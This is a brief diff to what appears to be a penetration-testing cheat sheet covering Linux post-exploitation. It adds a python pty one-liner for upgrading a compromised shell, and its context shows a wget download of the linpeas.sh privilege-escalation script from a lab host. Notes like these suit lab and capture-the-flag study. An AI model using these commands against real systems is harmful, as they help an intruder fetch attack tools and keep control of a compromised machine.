@@ -59,6 +59,9 @@ crontab -l
 
 wget http://192.168.64.137:8000/linpeas.sh -O linpeas.sh
 
+🔼 Upgrading to an interactive shell using python
+python -c 'import pty; pty.spawn("/bin/bash")'
+
 ## Windows Post Exploitation
 cd
 
